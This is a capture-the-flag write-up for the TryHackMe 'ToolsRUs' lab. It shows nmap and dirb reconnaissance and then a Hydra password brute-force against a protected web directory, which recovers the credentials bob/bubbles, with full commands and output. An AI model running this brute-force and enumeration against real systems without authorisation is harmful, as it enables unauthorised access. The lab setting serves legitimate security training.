# Room Information

Room link: https://tryhackme.com/room/toolsrus

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/01/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto the terminal
```bash
root@ip-10-10-171-134:~# nmap -sC -sV 10.10.199.35 > PortScan.txt
root@ip-10-10-171-134:~# cat PortScan.txt 
```
```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-01 23:39 BST
Nmap scan report for ip-10-10-199-35.eu-west-1.compute.internal (10.10.199.35)
Host is up (0.00067s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:d4:d7:0b:58:01:98:ba:74:62:e9:6b:54:25:a2:47 (RSA)
|   256 a1:2b:30:2f:cc:b7:6a:ea:3d:70:71:3c:ca:92:70:ee (ECDSA)
|_  256 5d:53:08:f7:5b:b1:3a:92:2b:7c:e8:7a:be:47:4b:15 (EdDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 02:FC:15:E6:68:FB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.03 seconds
```

#
> Scanning for Hiddent Web Directories Using Dirb
4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command onto the terminal
```bash
root@ip-10-10-171-134:~# dirb http://10.10.199.35 -r > WebDirectoryScan.txt
```
```bash
root@ip-10-10-171-134:~# cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul  1 23:40:10 2023
URL_BASE: http://10.10.199.35/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.199.35/ ----
==> DIRECTORY: http://10.10.199.35/guidelines/                                 
+ http://10.10.199.35/index.html (CODE:200|SIZE:168)                           
+ http://10.10.199.35/protected (CODE:401|SIZE:459)                            
+ http://10.10.199.35/server-status (CODE:403|SIZE:300)                        
                                                                               
-----------------
END_TIME: Sat Jul  1 23:40:12 2023
DOWNLOADED: 4612 - FOUND: 3
```

#
>
6. `firefox "http://{TARGET IP}/guidelines`

![]() 

7. `firefox "http://{TARGET IP}/protected"`

![]()

8. `hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}`
```bash
root@ip-10-10-171-134:~# hydra -l bob -P ~/Tools/wordlists/rockyou.txt http-get://10.10.199.35/protected
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-01 23:43:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.199.35:80//protected
[80][http-get] host: 10.10.199.35   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 23:43:53
```
